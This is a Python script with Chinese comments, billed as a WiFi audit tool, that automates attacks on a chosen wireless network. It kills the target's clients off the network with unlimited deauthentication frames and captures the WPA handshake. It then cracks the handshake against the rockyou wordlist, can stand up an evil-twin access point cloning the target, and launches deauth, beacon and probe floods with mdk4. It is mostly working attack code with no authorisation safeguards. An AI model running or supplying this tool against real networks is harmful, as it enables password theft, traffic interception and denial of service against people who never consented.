#!/usr/bin/env python3
"""
WiFi审计工具 - 基于 aircrack-ng 的多阶段自动化

阶段:
  1. 检查环境
  2. 启用监控模式  (airmon-ng start + iwconfig 确认)
  3. 扫描目标 AP   (airodump-ng 扫描，手动记录 BSSID/CH)
  4. 抓取握手包    (airodump-ng --bssid -c -w)   ← 终端1
  5. Deauth 踢下线 (aireplay-ng -0 0 -a -D)      ← 终端2，配合阶段4
  6. 字典爆破      (aircrack-ng -w)
  7. 清理关闭

选定目标后后台持续抓全局流量，程序退出才停止。
参数自动持久化保存，下次运行直接确认即可。
"""

import os
import sys
import json
import time
import subprocess
import readline
import atexit

# ── 全局变量 ────────────────────────────────────────

INTERFACE = ""
BSSID = ""
CHANNEL = ""
ESSID = ""
HANDSHAKE_CAP = ""
WORDLIST = "/usr/share/wordlists/rockyou.txt"
GLOBAL_CAPTURE_DIR = ""
GLOBAL_CAPTURE_PROC = None
RAW_IFACE = ""
HANDSHAKE_DIR = ""

CONFIG_FILE = os.path.expanduser("~/.wifi_attack_config.json")
HISTORY_FILE = os.path.expanduser("~/.wifi_attack_history")

# ── 持久化 ──────────────────────────────────────────

CONFIG_KEYS = [
    "RAW_IFACE", "INTERFACE", "BSSID", "CHANNEL", "ESSID",
    "WORDLIST", "GLOBAL_CAPTURE_DIR", "HANDSHAKE_DIR"
]

def load_config():
    global RAW_IFACE, INTERFACE, BSSID, CHANNEL, ESSID, WORDLIST, GLOBAL_CAPTURE_DIR, HANDSHAKE_DIR
    try:
        with open(CONFIG_FILE) as f:
            d = json.load(f)
        RAW_IFACE = d.get("RAW_IFACE", "")
        INTERFACE = d.get("INTERFACE", "")
        BSSID = d.get("BSSID", "")
        CHANNEL = d.get("CHANNEL", "")
        ESSID = d.get("ESSID", "")
        WORDLIST = d.get("WORDLIST", "/usr/share/wordlists/rockyou.txt")
        GLOBAL_CAPTURE_DIR = d.get("GLOBAL_CAPTURE_DIR", "")
        HANDSHAKE_DIR = d.get("HANDSHAKE_DIR", "")
        print(f"[*] 已加载配置: {CONFIG_FILE}")
    except (FileNotFoundError, json.JSONDecodeError):
        pass

def save_config():
    d = {k: globals()[k] for k in CONFIG_KEYS}
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(d, f, indent=2)
    except OSError as e:
        print(f"[!] 保存配置失败: {e}")

# ── 基础工具 ────────────────────────────────────────

def save_history():
    readline.write_history_file(HISTORY_FILE)

def setup_history():
    try:
        readline.read_history_file(HISTORY_FILE)
    except FileNotFoundError:
        pass
    atexit.register(save_history)

def run(cmd, capture_output=False, shell=False):
    try:
        if capture_output:
            r = subprocess.run(cmd, capture_output=True, text=True, shell=shell)
            return r.returncode, r.stdout.strip(), r.stderr.strip()
        else:
            r = subprocess.run(cmd, shell=shell)
            return r.returncode, "", ""
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
        return -1, "", ""

def check_root():
    if os.geteuid() != 0:
        print("[!] 请以 root 权限运行 (sudo)")
        sys.exit(1)

def banner():
    print(r"""
╔══════════════════════════════════════════╗
║        WiFi 审计助手 (aircrack-ng)       ║
╚══════════════════════════════════════════╝
""")

def wait_enter(msg="按 Enter 继续..."):
    try:
        input(msg)
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)

def get_input(prompt, default="", config_key=None):
    """带持久化的输入: 如有 config_key 则自动加载/保存"""
    if config_key and not default:
        default = globals().get(config_key, "")
    try:
        if default:
            r = input(f"{prompt} [{default}]: ").strip()
            val = r if r else default
        else:
            val = input(f"{prompt}: ").strip()
        if config_key:
            globals()[config_key] = val
            save_config()
        return val
    except (EOFError, KeyboardInterrupt):
        print()
        raise SystemExit(0)

def show_iwconfig():
    print("\n[*] 当前无线接口状态 (iwconfig):")
    print("-" * 40)
    subprocess.run(["iwconfig"])
    print("-" * 40)

# ── 打开新终端 ─────────────────────────────────────

TERMINAL_EMU = None

def detect_terminal():
    global TERMINAL_EMU
    if TERMINAL_EMU:
        return TERMINAL_EMU
    candidates = [
        "/usr/bin/x-terminal-emulator",
        "/usr/bin/sensible-terminal",
        "/usr/bin/qterminal",
        "/usr/bin/konsole",
        "/usr/bin/gnome-terminal",
        "/usr/bin/lxterminal",
        "/usr/bin/xterm",
    ]
    for c in candidates:
        if os.path.exists(c):
            TERMINAL_EMU = c
            return c
    print("[!] 未找到终端模拟器，将使用后台进程模式")
    return None

def open_terminal(title, cmd_list):
    """在新终端窗口中执行命令，返回 Popen 对象"""
    term = detect_terminal()
    if not term:
        return subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    import tempfile
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False, prefix="deauth_")
    tmp.write("#!/bin/bash\n")
    tmp.write(" ".join(cmd_list) + "\n")
    tmp.write('echo "\\n[完成] 按 Enter 关闭此窗口"\n')
    tmp.write("read -r\n")
    tmp.close()
    os.chmod(tmp.name, 0o755)

    if "konsole" in term:
        proc = subprocess.Popen([term, "--hold", "-e", tmp.name],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
    elif "qterminal" in term or "lxterminal" in term:
        proc = subprocess.Popen([term, "-e", tmp.name],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
    elif "gnome-terminal" in term:
        proc = subprocess.Popen([term, "--", "bash", tmp.name],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
    else:
        proc = subprocess.Popen([term, "-e", tmp.name],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
    print(f"[*] 已打开新终端: {title}")
    return proc

# ── 全局抓包 ────────────────────────────────────────

def start_global_capture():
    global GLOBAL_CAPTURE_PROC, GLOBAL_CAPTURE_DIR
    if not BSSID or not CHANNEL or not INTERFACE:
        return

    GLOBAL_CAPTURE_DIR = get_input("全局抓包保存目录", config_key="GLOBAL_CAPTURE_DIR")
    os.makedirs(GLOBAL_CAPTURE_DIR, exist_ok=True)
    cap_path = os.path.join(GLOBAL_CAPTURE_DIR, "global")

    cmd = [
        "airodump-ng", "--bssid", BSSID,
        "-c", CHANNEL,
        "-w", cap_path,
        INTERFACE,
        "--write-interval", "1"
    ]
    print(f"\n[*] 启动后台全局抓包，程序退出才停止")
    print(f"    命令: {' '.join(cmd)}")
    print(f"    保存: {GLOBAL_CAPTURE_DIR}/global-*.cap\n")

    GLOBAL_CAPTURE_PROC = subprocess.Popen(
        cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL, start_new_session=True
    )
    print(f"[+] 全局抓包 PID: {GLOBAL_CAPTURE_PROC.pid}")

def stop_global_capture():
    global GLOBAL_CAPTURE_PROC
    if not GLOBAL_CAPTURE_PROC:
        return
    print(f"\n[*] 停止全局抓包 (PID: {GLOBAL_CAPTURE_PROC.pid})...")
    GLOBAL_CAPTURE_PROC.terminate()
    try:
        GLOBAL_CAPTURE_PROC.wait(timeout=5)
    except subprocess.TimeoutExpired:
        GLOBAL_CAPTURE_PROC.kill()
    print("[+] 全局抓包已停止")
    if GLOBAL_CAPTURE_DIR:
        from glob import glob
        files = sorted(glob(os.path.join(GLOBAL_CAPTURE_DIR, "global*")))
        total = sum(os.path.getsize(f) for f in files if os.path.isfile(f))
        print(f"    文件数: {len(files)}, 总大小: {total//1024} KB")
    GLOBAL_CAPTURE_PROC = None

# ── 阶段函数 ────────────────────────────────────────

def stage_1_check_env():
    print("\n[1/9] 检查环境")
    print("-" * 40)
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
    missing = [t for t in tools if subprocess.run(["which", t], capture_output=True).returncode != 0]
    if missing:
        print(f"[!] 缺少: {', '.join(missing)}")
        print("    sudo apt install aircrack-ng")
        sys.exit(1)
    print("[+] 环境检查通过")
    return True

def stage_2_monitor():
    global INTERFACE
    print("\n[2/9] 启用监控模式")
    print("-" * 40)

    print("[*] 查看当前网卡 (iwconfig):")
    subprocess.run(["iwconfig"])
    print("-" * 40)

    raw_iface = get_input("请输入无线网卡名称", config_key="RAW_IFACE")
    RAW_IFACE = raw_iface
    if not raw_iface:
        print("[!] 网卡名称不能为空")
        return False

    print("[*] 结束干扰进程...")
    run(["airmon-ng", "check", "kill"], capture_output=True)

    print(f"[*] airmon-ng start {raw_iface}")
    rc, out, err = run(["airmon-ng", "start", raw_iface], capture_output=True)
    print(out)
    if err:
        print(err)
    if rc != 0:
        print("[!] 启动监控模式失败")
        return False

    print("\n[*] 确认是否已变成 Mode:Monitor ↓")
    show_iwconfig()

    detected = raw_iface
    try:
        r = subprocess.run(["iwconfig"], capture_output=True, text=True)
        for line in r.stdout.split("\n"):
            if "Mode:Monitor" in line:
                detected = line.split()[0]
                break
    except:
        pass
    mon_iface = get_input("请输入监控模式下的接口名", detected, "INTERFACE")
    INTERFACE = mon_iface
    save_config()
    print(f"[+] 监控接口 = {INTERFACE}")
    return True

def stage_3_scan():
    global BSSID, CHANNEL, ESSID
    print("\n[3/9] 扫描目标 AP")
    print("-" * 40)
    print("[*] 启动 airodump-ng，记下目标的 BSSID 和 CH")
    print("[*] 找到目标后 Ctrl+C 停止\n")
    wait_enter("按 Enter 启动扫描")

    try:
        p = subprocess.Popen(["airodump-ng", INTERFACE])
        p.wait()
    except KeyboardInterrupt:
        p.terminate()
    except:
        pass

    print()
    print("[*] 请根据扫描结果填写目标信息")
    BSSID = get_input("目标 BSSID (如 AA:BB:CC:DD:EE:FF)", config_key="BSSID")
    CHANNEL = get_input("目标信道 (CH)", config_key="CHANNEL")
    ESSID = get_input("目标 ESSID (WiFi 名称)", config_key="ESSID")
    if not BSSID or not CHANNEL:
        print("[!] BSSID 和 CH 不能为空")
        return False

    save_config()
    start_global_capture()
    return True

def stage_4_handshake():
    """抓握手包：新终端1跑 airodump-ng，新终端2跑 deauth"""
    global HANDSHAKE_CAP, HANDSHAKE_DIR
    print("\n[4/9] 抓取 WPA 握手包")
    print("-" * 40)
    print("  新终端1: airodump-ng 监听握手包")
    print("  新终端2: aireplay-ng deauth 踢客户端")
    print("  两个终端自动弹出，看情况操作\n")

    HANDSHAKE_DIR = get_input("握手包保存路径", config_key="HANDSHAKE_DIR")
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    cap_path = os.path.join(HANDSHAKE_DIR, "handshake")
    save_config()

    # 启动 airodump-ng（新终端）
    dump_cmd = [
        "airodump-ng", "--bssid", BSSID,
        "-c", CHANNEL,
        "-w", cap_path,
        INTERFACE
    ]
    dump_proc = open_terminal("airodump-ng 抓握手包", dump_cmd)
    time.sleep(2)

    # 启动 deauth（新终端）
    deauth_cmd = ["aireplay-ng", "-0", "0", "-a", BSSID, INTERFACE, "-D"]
    deauth_proc = open_terminal("aireplay-ng Deauth", deauth_cmd)

    print("\n[*] 两个新终端已打开，观察终端1是否出现 [WPA handshake]")
    print("[*] 出现后按 Enter 继续（可 Ctrl+C 强制停止等待）\n")
    wait_enter("确认抓到握手包后按 Enter")

    # 关闭终端
    for p in (dump_proc, deauth_proc):
        if p:
            p.terminate()
            try:
                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                p.kill()

    from glob import glob
    caps = sorted(glob(os.path.join(HANDSHAKE_DIR, "*.cap")), key=os.path.getmtime, reverse=True)
    caps = [f for f in caps if os.path.getsize(f) > 0]
    if not caps:
        print("[!] 未找到握手包文件")
        print("    - 可能目标 AP 当前无客户端连接")
        print("    - 建议: 去 [5] 手动 Deauth 再试，或等有客户端时重试")
        return False

    HANDSHAKE_CAP = caps[0]
    print(f"\n[+] 握手包: {HANDSHAKE_CAP}")
    return True

def stage_5_deauth_manual():
    """手动 deauth：弹出新终端执行"""
    print("\n[5/9] 手动 Deauth 踢下线")
    print("-" * 40)
    print("  弹出新终端执行 deauth，用于补刀或单独执行\n")

    print(f"[*] 命令: aireplay-ng -0 0 -a {BSSID} {INTERFACE} -D\n")
    wait_enter("按 Enter 弹出新终端执行 Deauth")

    deauth_cmd = ["aireplay-ng", "-0", "0", "-a", BSSID, INTERFACE, "-D"]
    deauth_proc = open_terminal("Deauth 攻击", deauth_cmd)
    print("[*] Deauth 已在新的终端窗口中运行")
    print("[*] 可在此窗口继续其他操作，新终端关闭不影响本脚本\n")
    return True

def stage_6_crack():
    global HANDSHAKE_CAP
    print("\n[6/9] 字典爆破")
    print("-" * 40)

    if not HANDSHAKE_CAP or not os.path.exists(HANDSHAKE_CAP):
        print("[!] 无握手包文件")
        handshake_dir = HANDSHAKE_DIR or "/tmp/handshake"
        from glob import glob
        caps = glob(os.path.join(handshake_dir, "*.cap"))
        if caps:
            print(f"[*] 在 {handshake_dir} 下找到:")
            for i, f in enumerate(caps):
                print(f"    [{i}] {f} ({os.path.getsize(f)} bytes)")
            idx = get_input("选择文件编号（留空取消）")
            if idx.isdigit() and 0 <= int(idx) < len(caps):
                HANDSHAKE_CAP = caps[int(idx)]
                globals()["HANDSHAKE_CAP"] = HANDSHAKE_CAP
            else:
                return False
        else:
            print("[!] 请先完成阶段4抓取握手包")
            return False

    wl = get_input("字典路径", config_key="WORDLIST")
    if not os.path.exists(wl):
        compressed = f"{wl}.gz"
        if os.path.exists(compressed):
            print(f"[*] 发现 {compressed}，解压中...")
            run(["gzip", "-d", compressed])
        if not os.path.exists(wl):
            print("[!] 字典不存在")
            return False

    print(f"\n[*] 在新终端中执行: aircrack-ng -w {wl} {HANDSHAKE_CAP}")
    crack_cmd = ["aircrack-ng", "-w", wl, HANDSHAKE_CAP]
    crack_proc = open_terminal("aircrack-ng 爆破", crack_cmd)
    if crack_proc:
        print("[*] 爆破窗口已打开，等待爆破完成...")
        print("[*] 此窗口可继续其他操作\n")
    return True


def stage_7_eviltwin():
    """钓鱼 AP：用 airbase-ng 创建一个伪装 AP"""
    print("\n[7/9] 钓鱼 AP (Evil Twin)")
    print("-" * 40)
    print("  使用 airbase-ng 创建同名虚假 AP，用于捕获客户端握手\n")

    if not BSSID or not ESSID:
        print("[!] 缺少目标 BSSID 或 ESSID，请先执行阶段3")
        return False

    print(f"  目标: {ESSID} ({BSSID}) CH {CHANNEL}")
    confirm = get_input("是否启动钓鱼 AP？(y/n)", "y").lower()
    if confirm != "y":
        print("[-] 已跳过")
        return True

    # 创建一个虚拟网卡用于 NAT（可选）
    cmd = [
        "airbase-ng", "-a", BSSID,
        "--essid", ESSID,
        "-c", CHANNEL,
        INTERFACE
    ]
    proc = open_terminal(f"Evil Twin: {ESSID}", cmd)
    if proc:
        print("[*] 钓鱼 AP 已在新的终端窗口中运行")
        print("[*] 关闭该终端即可停止\n")
    return True


def stage_8_flood():
    """WiFi 泛洪攻击：deauth / beacon / probe 泛洪"""
    print("\n[8/9] WiFi 泛洪攻击")
    print("-" * 40)
    print("  泛洪类型:")
    print("    [d] Deauth 泛洪  - 向已连接客户端发送 deauth 包")
    print("    [b] Beacon 泛洪  - 伪造大量虚假 AP 信标")
    print("    [p] Probe 泛洪   - 发送大量探测请求\n")

    if not BSSID and not ESSID:
        print("[!] 建议先执行阶段3获取目标信息")

    # 检测 / 安装 mdk4
    mdk = subprocess.run(["which", "mdk4"], capture_output=True, text=True).stdout.strip()
    if not mdk:
        print("[*] 未安装 mdk4，尝试安装...")
        ret = run(["apt", "install", "-y", "mdk4"], capture_output=True)
        if ret[0] != 0:
            print("[!] 安装 mdk4 失败，请手动安装: sudo apt install mdk4")
            return False
        mdk = "mdk4"

    ftype = get_input("选择泛洪类型 (d/b/p)", "d").lower()

    if ftype == "d":
        target = BSSID or get_input("目标 BSSID（留空则全信道泛洪）")
        if target:
            cmd = [mdk, INTERFACE, "d", "-a", target]
        else:
            cmd = [mdk, INTERFACE, "d"]
    elif ftype == "b":
        ssid = ESSID or get_input("伪造的 ESSID 名称", "FreeWiFi")
        cmd = [mdk, INTERFACE, "b", "-n", ssid]
    elif ftype == "p":
        cmd = [mdk, INTERFACE, "p"]
    else:
        print("[!] 无效类型")
        return False

    proc = open_terminal(f"mdk4 {ftype} 泛洪", cmd)
    if proc:
        print(f"[*] {ftype} 泛洪已在新的终端窗口中运行")
        print("[*] 关闭该终端即可停止\n")
    return True


def stage_9_cleanup():
    print("\n[9/9] 清理关闭")
    print("-" * 40)

    stop_global_capture()

    if INTERFACE:
        print(f"[*] airmon-ng stop {INTERFACE}")
        run(["airmon-ng", "stop", INTERFACE])
        run(["systemctl", "start", "NetworkManager"], capture_output=True)
        print("[+] 网络服务已恢复")
    print("[+] 清理完成\n")

# ── 菜单 ────────────────────────────────────────────

def main():
    setup_history()
    load_config()

    stages = [
        ("1", "检查环境",              stage_1_check_env),
        ("2", "启用监控模式",          stage_2_monitor),
        ("3", "扫描目标 AP",           stage_3_scan),
        ("4", "抓握手包 (自动deauth)",  stage_4_handshake),
        ("5", "手动 Deauth 踢下线",    stage_5_deauth_manual),
        ("6", "字典爆破",              stage_6_crack),
        ("7", "钓鱼 AP (Evil Twin)",   stage_7_eviltwin),
        ("8", "WiFi 泛洪攻击",         stage_8_flood),
        ("9", "清理关闭",              stage_9_cleanup),
    ]
    stage_map = {k: (d, f) for k, d, f in stages}
    stage_keys = [k for k, _, _ in stages]

    def do_stage(k, desc, func):
        print(f"\n{'='*50}")
        print(f"  阶段 {k}: {desc}")
        print(f"{'='*50}")
        ok = func()
        if not ok:
            print(f"[!] 阶段 {k} 失败")
        return ok

    def run_stage(k):
        desc, func = stage_map[k]
        return do_stage(k, desc, func)

    def after_stage():
        print()
        try:
            r = input("[Enter] 下一步  [B] 上一步  [M] 主菜单  [Q] 退出 > ").strip().upper()
            return r
        except (EOFError, KeyboardInterrupt):
            print()
            return "Q"

    while True:
        banner()
        print("  阶段列表:")
        for k, desc, _ in stages:
            print(f"    [{k}] {desc}")
        print()
        print("  [A] 全自动执行 (1→2→3→4→5→6→7→8→9)")
        print("  [C] 清除已保存的配置")
        if GLOBAL_CAPTURE_PROC:
            print("  [*] 全局抓包后台运行中 (退出时自动结束)")
        print("  [Q] 退出\n")

        choice = input("选择 > ").strip().upper()

        if choice == "Q":
            break

        elif choice == "C":
            try:
                os.remove(CONFIG_FILE)
                print(f"[+] 已清除: {CONFIG_FILE}")
            except FileNotFoundError:
                print("[!] 无配置可清除")

        elif choice == "A":
            pos = 0
            while True:
                if pos >= len(stage_keys):
                    break
                k = stage_keys[pos]
                # 阶段4抓到握手包后自动跳过阶段5（不用再弹 deauth）
                if k == "5" and HANDSHAKE_CAP:
                    print("\n  [-] 握手包已抓到，跳过手动 Deauth\n")
                    pos += 1
                    continue
                run_stage(k)
                r = after_stage()
                if r == "Q":
                    return
                elif r == "B":
                    if pos > 0:
                        pos -= 1
                    continue
                elif r == "M":
                    break
                pos += 1
            wait_enter("\n流程结束，按 Enter 回主菜单")

        elif choice in stage_map:
            run_stage(choice)
            wait_enter()
        else:
            print("[!] 无效选项")

if __name__ == "__main__":
    check_root()
    try:
        main()
    except SystemExit:
        pass
    except KeyboardInterrupt:
        print("\n\n[!] 用户退出")
    finally:
        stage_9_cleanup()
